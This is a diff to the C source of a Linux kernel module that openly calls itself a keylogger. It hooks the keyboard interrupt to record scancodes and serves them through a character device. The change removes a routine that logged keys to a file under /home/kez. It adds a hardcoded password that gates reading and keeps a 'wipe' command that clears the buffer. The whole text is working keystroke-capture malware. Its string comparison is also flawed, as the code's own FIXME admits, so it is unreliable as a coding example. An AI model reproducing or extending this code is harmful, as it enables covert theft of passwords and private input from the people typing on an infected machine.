@@ -14,11 +14,6 @@
 #include <asm/uaccess.h>
 #include <linux/buffer_head.h>
 
-
-bool str_eq(const char* str1, const char* str2, size_t len);
-
-void delete_content(void);
-
 int init_module(void);
 void cleanup_module(void);
 
@@ -36,13 +31,13 @@ static int Major;
 
 // Device part {
 static bool is_dev_opened = false;
-static char msg[BUF_LEN];
-static char *buff_Ptr;
+// static char msg[BUF_LEN];
+// static char *buff_Ptr;
 static bool deleted = true;
-static bool output_once = true;
-static bool do_write_to_file = false;
+static bool is_openned_once = true;
 static int keys_pressed = 0;
 static int scancodes_was_read = 0;
+static char * key = "very_secret_key";
 // }
 
 // Kbd part {
@@ -78,66 +73,9 @@ void inplace_reverse(char * str)
 	}
 }
 
-struct file * file_open(const char *path, int flags, int rights)
-{
-	struct file * filp = NULL;
-	mm_segment_t oldfs;
-	int err = 0;
-
-	oldfs = get_fs();
-	set_fs(get_ds());
-	filp = filp_open(path, flags, rights);
-	set_fs(oldfs);
-	if (IS_ERR(filp)) {
-		err = PTR_ERR(filp);
-		return NULL;
-	}
-	return filp;
-}
-
-void file_close(struct file * file)
-{
-	filp_close(file, NULL);
-}
-
-int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
-{
-	mm_segment_t oldfs;
-	int ret;
-
-	oldfs = get_fs();
-	set_fs(get_ds());
-
-	ret = vfs_read(file, data, size, &offset);
-
-	set_fs(oldfs);
-	return ret;
-}
-
-int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
-{
-	mm_segment_t oldfs;
-	int ret;
-
-	oldfs = get_fs();
-	set_fs(get_ds());
-
-	ret = vfs_write(file, data, size, &offset);
-
-	set_fs(oldfs);
-	return ret;
-}
-
-int file_sync(struct file * file)
-{
-	vfs_fsync(file, 0);
-	return 0;
-}
-
-
-
 // implementation of strcmp
-bool str_cmp(const char* str1, const char* str2)
+// FIXME: check the lengths for equality
+bool str_eq(const char* str1, const char* str2)
 {
 	while ( (*(str1) != '\0') && (*(str2) != '\0'))
 	{
@@ -152,6 +90,21 @@ bool str_cmp(const char* str1, const char* str2)
 	return true;
 }
 
+bool str_starts_with(const char * what, const char * with)
+{
+	while ((*(what) != '\0') && (*(with) != '\0'))
+	{
+		if (*(what) != *(with))
+		{
+			return false;
+		}
+		++what;
+		++with;
+	}
+
+	return true;
+}
+
 
 void delete_content(void)
 {
@@ -160,10 +113,11 @@ void delete_content(void)
 }
 
 static struct file_operations fops = {
-        .read = device_read,
-        .write = device_write,
-        .open = device_open,
-        .release = device_release };
+	.read = device_read,
+	.write = device_write,
+	.open = device_open,
+	.release = device_release
+};
 
 static irqreturn_t irq_handler(int irq, void * data)
 {
@@ -176,18 +130,9 @@ static irqreturn_t irq_handler(int irq, void * data)
 static irqreturn_t irq_thread(int irq, void * data)
 {
 	char * sc = (char *)data;
-	char buffer[7];
 
 	if (!(sc[0] & 0x80))
 	{
-		if (do_write_to_file)
-		{
-			struct file* outputfile = file_open("/home/kez/log", O_RDWR | O_APPEND | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
-			snprintf(buffer, 6, "%#04x ", (unsigned int)(*sc));
-			file_write(outputfile, 0, buffer, 5);
-			file_close(outputfile);
-		}
-
 		stash[keys_pressed] = 0x7f & sc[0];
 		keys_pressed = (keys_pressed + 1) % BUF_LEN;
 	}
@@ -229,16 +174,18 @@ void cleanup_module(void)
 static int device_open(struct inode *inode, struct file *file)
 {
 	printk(KERN_ALERT "[KEYLOGGER] Openning device.\n");
+
 	if (is_dev_opened)
 	{
 		return -EBUSY;
 	}
 
+	// reset internal logic state
 	is_dev_opened = true;
-	buff_Ptr = msg;
+	scancodes_was_read = 0;
+
 	try_module_get(THIS_MODULE);
 
-	scancodes_was_read = 0;
 	return SUCCESS;
 }
 
@@ -254,14 +201,18 @@ static int device_release(struct inode *inode, struct file *file)
 static ssize_t device_read(struct file *filp, char __user * buff, size_t len, loff_t * offset)
 {
 	int bytes = 0;
-	// char c; // unused variable
-	// int size = 0; // unused variable
-
 	const int output_buffer_size = 5;
 	char buffer[output_buffer_size];
 	int i;
 
 	printk(KERN_ALERT "[KEYLOGGER] Reading device.\n");
+
+	if (!is_openned_once)
+	{
+		return 0;
+	}
+
+	is_openned_once = false;
 
 	if (scancodes_was_read == keys_pressed)
 	{
@@ -280,8 +231,7 @@ static ssize_t device_read(struct file *filp, char __user * buff, size_t len, lo
 		--len;
 	}
 
-	printk(KERN_INFO "Bytes read: %d\n", bytes - 1);
-	return bytes * output_buffer_size;
+	return bytes * output_buffer_size; // must be equal to number of the printed bytes
 }
 
 static ssize_t device_write(struct file *filp, const char __user * buff, size_t len, loff_t * offset)
@@ -296,8 +246,14 @@ static ssize_t device_write(struct file *filp, const char __user * buff, size_t 
 		get_user(new_msg[i], buff + i);
 	}
 
-	// TODO: add key: write a key to driver, after that u can read from it
-	if (str_cmp(new_msg, "wipe"))
+	if (str_starts_with(new_msg, "open"))
+	{
+		if (str_eq(new_msg + 5, key))
+		{
+			is_openned_once = true;
+		}
+	}
+	if (str_eq(new_msg, "wipe"))
 	{
 		keys_pressed = 0;
 	}
@@ -305,5 +261,6 @@ static ssize_t device_write(struct file *filp, const char __user * buff, size_t 
 	{
 		// do nothing
 	}
+
 	return i;
 }
